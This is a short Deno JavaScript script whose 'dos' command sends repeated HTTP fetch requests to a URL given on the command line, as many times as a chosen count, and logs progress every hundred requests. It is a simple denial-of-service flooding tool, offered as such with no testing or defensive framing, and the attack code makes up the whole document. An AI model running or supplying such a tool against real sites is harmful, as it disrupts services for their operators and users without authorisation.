const commands = Deno.args;
const command = [];
commands.forEach((commands) => {
  const result = commands.indexOf("--");
  if (result == -1) {
    command.push(commands);
  } else {
    //
  }
});
switch (command[0]) {
  case "dos":
    for (let i = 0; i < command[2]; i++) {
      const result = await fetch(command[1]);
      if (i % 100 == 0) {
        console.log(i);
        console.log(result);
      }
    }
    break;
  default:
    console.log("error");
    break;
}
